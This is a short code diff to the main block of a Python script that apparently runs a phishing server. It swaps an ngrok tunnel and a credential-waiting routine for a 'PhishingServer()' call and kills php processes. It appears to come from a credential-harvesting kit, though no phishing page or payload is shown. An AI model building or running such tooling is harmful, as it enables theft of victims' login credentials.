@@ -46,16 +46,13 @@ def main():
 
 if __name__ == "__main__":
     try:        
-        system('pkill -f ngrok')
         system('pkill -f php')
         pre()
         main()
-        with ngrok_start() as ngrok:
-            #runNgrok()
-            Process(target=runServer).start()
-            waitCreds()
+        #with ngrok_start() as ngrok:
+        #    with runServer() as rS:
+        #        waitCreds()
+        PhishingServer()
     except KeyboardInterrupt:
-        system('pkill -f ngrok')
-        system('pkill -f php')
         end()
         exit(0)
